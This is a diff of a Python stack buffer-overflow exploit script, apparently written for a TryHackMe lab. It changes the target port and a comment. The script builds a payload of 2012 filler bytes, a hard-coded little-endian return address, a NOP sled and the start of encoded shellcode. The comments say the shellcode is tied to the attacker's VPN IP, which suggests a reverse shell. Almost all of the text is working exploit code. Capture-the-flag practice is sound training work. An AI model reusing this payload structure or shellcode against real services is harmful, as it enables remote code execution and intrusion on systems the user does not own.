@@ -3,10 +3,11 @@
 import sys, socket
 
 ip = "Insert THM VPN IP" # Or use sys.argv[1] to take cmdline arg
-port = 9999 # Or use sys.argv[2] to take cmdline arg
+port = 8889 # Or use sys.argv[2] to take cmdline arg
 username = b'user'
 
-# Remember to regenerate shellcode if changing THM VPN IP
+# Remember to regenerate shellcode if changing THM VPN IP or port!
+
 payload = b'A'*2012+b'\xdf\x14\x50\x62'+b'\x90'*32 # Remember little endian reverse input for memory address
 payload += b"\xda\xd2\xbb\x0b\x2e\xa5\xef\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
 payload += b"\x52\x31\x5f\x17\x03\x5f\x17\x83\xe4\xd2\x47\x1a\x06\xc2\x0a"
